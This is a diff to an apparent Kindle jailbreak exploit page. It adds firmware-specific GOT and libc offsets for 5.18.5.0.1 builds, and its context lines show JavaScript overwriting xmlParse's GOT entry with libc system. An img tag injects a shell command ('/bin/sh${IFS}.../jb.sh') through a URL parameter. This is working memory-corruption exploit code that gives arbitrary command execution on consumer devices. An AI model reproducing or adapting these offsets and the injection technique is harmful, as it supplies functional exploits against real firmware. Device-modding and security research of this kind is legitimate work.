@@ -69,6 +69,10 @@ const offsets = { // Probably a better way to do this ¯\_(ツ)_/¯
   '454606': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_all_new_paperwhite_11th_5.18.5
   '454607': { memcpy_got: 0xbe4ac, xml_got: 0xbebd8, memcpy_offset: 0x94c00, system_offset: 0x42938 }, // fs_update_kindle_scribe_2024_5.18.5
   '454608': { memcpy_got: 0xbe4ac, xml_got: 0xbebd8, memcpy_offset: 0x94c00, system_offset: 0x42938 }, // fs_update_kindle_scribe_5.18.5
+  '455678': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_11th_5.18.5.0.1
+  '455679': { memcpy_got: 0xbe4ac, xml_got: 0xbebd8, memcpy_offset: 0x94c00, system_offset: 0x42938 }, // fs_update_kindle_11th_2024_5.18.5.0.1
+  '455680': { memcpy_got: 0xbe4ac, xml_got: 0xbebd8, memcpy_offset: 0x94c00, system_offset: 0x42938 }, // fs_update_kindle_all_new_paperwhite_12th_5.18.5.0.1
+  '455681': { memcpy_got: 0xac740, xml_got: 0xace88, memcpy_offset: 0x7e0c0, system_offset: 0x39b48 }, // fs_update_kindle_all_new_paperwhite_11th_5.18.5.0.1
 };
 
 
@@ -202,6 +206,6 @@ aliased_uint32array[xml_got >>2] = libc_system; // Replace the GOT for xmlParseU
 
 alert("Bang!");
 </script>
-<img src="http://127.0.0.1/?a=;/bin/sh${IFS}/mnt/us/system/.assets/jb.sh"></img>
+<img src="http://127.0.0.1/?a=;/bin/sh${IFS}/mnt/us/system/.assets/jb.sh" />
 </body>
 </html>
